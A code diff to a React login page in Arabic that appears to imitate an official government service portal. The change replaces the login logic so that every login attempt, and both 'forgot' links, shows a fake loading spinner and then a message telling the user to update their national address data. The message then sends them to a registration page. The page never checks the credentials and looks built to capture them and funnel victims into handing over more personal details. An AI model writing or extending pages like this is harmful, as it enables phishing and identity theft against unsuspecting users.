@@ -1,12 +1,17 @@
 import { useState, useEffect } from "react";
-import { Link } from "wouter";
+import { Link, useLocation } from "wouter";
 
 export default function Login() {
+  const [, setLocation] = useLocation();
   const [accountType, setAccountType] = useState("individuals");
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [captchaInput, setCaptchaInput] = useState("");
   const [captchaCode, setCaptchaCode] = useState("");
+  
+  // Loading and message states
+  const [isLoading, setIsLoading] = useState(false);
+  const [showMessage, setShowMessage] = useState(false);
 
   // Generate random CAPTCHA
   const generateCaptcha = () => {
@@ -22,14 +27,69 @@ export default function Login() {
     generateCaptcha();
   }, []);
 
+  // Handle action with loading and message
+  const handleActionWithLoading = () => {
+    setIsLoading(true);
+    setTimeout(() => {
+      setIsLoading(false);
+      setShowMessage(true);
+    }, 3000);
+  };
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    // Handle login logic here
-    console.log({ accountType, username, password, captchaInput });
+    handleActionWithLoading();
+  };
+
+  const handleForgotUsername = (e: React.MouseEvent) => {
+    e.preventDefault();
+    handleActionWithLoading();
+  };
+
+  const handleForgotPassword = (e: React.MouseEvent) => {
+    e.preventDefault();
+    handleActionWithLoading();
+  };
+
+  const handleContinue = () => {
+    setShowMessage(false);
+    setLocation('/register');
   };
 
   return (
     <div className="min-h-screen bg-gray-100" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
+      {/* Loading Overlay */}
+      {isLoading && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg p-8 flex flex-col items-center gap-4">
+            <div className="w-12 h-12 border-4 border-[#04ccf0] border-t-transparent rounded-full animate-spin"></div>
+            <p className="text-gray-700 font-medium">جاري التحميل...</p>
+          </div>
+        </div>
+      )}
+
+      {/* Message Modal */}
+      {showMessage && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
+            <div className="mb-6">
+              <svg className="w-16 h-16 mx-auto text-[#146c84]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+            </div>
+            <p className="text-lg font-bold text-[#143c3c] mb-6">
+              عليك تحديث بيانات عنوانك الوطني للإستفادة من الخدمات
+            </p>
+            <button
+              onClick={handleContinue}
+              className="px-12 py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors"
+            >
+              متابعة
+            </button>
+          </div>
+        </div>
+      )}
+
       {/* Header - dark green bar with English on left */}
       <header className="bg-[#143c3c] py-2">
         <div className="container mx-auto px-4">
@@ -226,13 +286,21 @@ export default function Login() {
 
               {/* Forgot Links */}
               <div className="flex flex-col md:flex-row items-start md:items-center gap-4 md:gap-8 mt-6">
-                <a href="#" className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base">
+                <a 
+                  href="#" 
+                  onClick={handleForgotUsername}
+                  className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base"
+                >
                   نسيت اسم المستخدم
                   <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                   </svg>
                 </a>
-                <a href="#" className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base">
+                <a 
+                  href="#" 
+                  onClick={handleForgotPassword}
+                  className="flex items-center gap-2 text-[#146c84] hover:text-[#0d4a5c] text-sm md:text-base"
+                >
                   نسيت كلمة المرور
                   <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
@@ -264,8 +332,6 @@ export default function Login() {
           </div>
         </div>
       </footer>
-
-
     </div>
   );
 }
